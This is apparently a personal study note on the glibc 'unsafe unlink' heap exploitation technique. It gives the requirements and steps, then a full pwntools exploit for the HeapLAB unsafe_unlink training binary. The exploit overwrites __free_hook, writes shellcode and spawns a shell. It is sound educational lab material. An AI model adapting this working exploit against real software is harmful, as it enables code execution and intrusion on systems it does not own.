---
title: "Unsafe Unlink"
tags: [Binary Exploitation, Heap]
excerpt: "Unsafe Unlink"
layout: single
classes: wide
--- 

Exploiting free on a corrupted chunk to get arbitrary write. Unsafe unlinking process will result in a reflected arbitrary 8-byte write anywhere.

## Requirements
* Allocate chunks in the unsorted bin, `120 - 1000 bytes`
* Ability to corrupt `prev_size` and `prev_in_use` flag of a chunk, usually through heap overflow
* Ability to forge a fake freed chunk by writing valid `fd` and `bk` pointers in a chunk's data
    * `fd` and `bk` must both be writable addresses, such as GOT

## Process
### Arbitrary Write Primitive
_Assuming `target` is the address to be overwritten_
* Allocate 2 chunks in the unsorted bin
* In the fake free chunk:
    * `fd (first 8 bytes in chunk data)` contains `target`
    * `bk (next 8 bytes in chunk data)` contains 8-bytes to be written to `target`
* In the corrupted chunk:
    * Overwrite `prev_size` to be the size of the previous fake free chunk
    * Overwite `prev_in_use` to be 0, `size` of chunk `0x91 -> 0x90`
* Free the corrupted chunk
    * `bk` will contain `fd`, vice versa

## Example: HeapLAB unsafe_unlink   
_chunk A: fake free chunk, chunk B: corrupted chunk_
RCE is gained by writing address of chunk A's data to `__free_hook`, and writing shellcode in chunk A's data as `NX` is not set.
```python
from pwn import *

config = {"elf" : "./unsafe_unlink"}

def malloc(size):
    sla('> ', '1')
    sla('size: ', str(size))

def edit(index, data):
    sla('> ', '2')
    sla('index: ', str(index))
    sla('data: ', data)

def free(index):
    sla('> ', '3')
    sla('index: ', str(index))

def exploit(p):
    # Get puts and heap leak
    ru('puts() @ ')
    puts = int(p.recvline().strip(), 16)
    ru('heap @ ')
    heap_addr = int(p.recvline().strip(), 16)
    
    # Calculate libc addresses
    libc.address = puts - libc.symbols['puts']
    free_hook = libc.symbols['__free_hook']

    malloc(0x88)
    malloc(0x88)
    
    # In chunk A: Forge fake free chunk by faking fd and bk
    # In chunk B: Overwrite prev_size and prev_in_use to make the heap think A is freed
    fd = free_hook - 24
    bk = heap_addr + 0x10
    prev_size = 0x90
    size = 0x90
    data = p64(fd) + p64(bk) + '\x00'*112 + p64(prev_size) + p64(size)
    edit(0, data)

    # Free chunk B, heap will try to consolidate A and B with unlinking
    # Overwrite fd with bk, bk with fd due to unsafe unlinking
    # __free_hook now points to data of chunk A
    free(1)

    # Write shellcode into data of chunk A
    shellcode = asm(shellcraft.sh())
    edit(0, shellcode)

    # Pop shell using free() and __free_hook
    free(0)
    
    lg('heap_addr: ' + hex(heap_addr))

    p.interactive()

if __name__ == "__main__":
    elf = context.binary = ELF(config["elf"])
    libc = elf.libc

    p = process(elf.path)
    pause()

    sl = lambda a: p.sendline(a)
    sla = lambda a,b: p.sendlineafter(a,b)
    ru = lambda a: p.recvuntil(a)
    lg = lambda a : log.info(a)

    exploit(p)
```
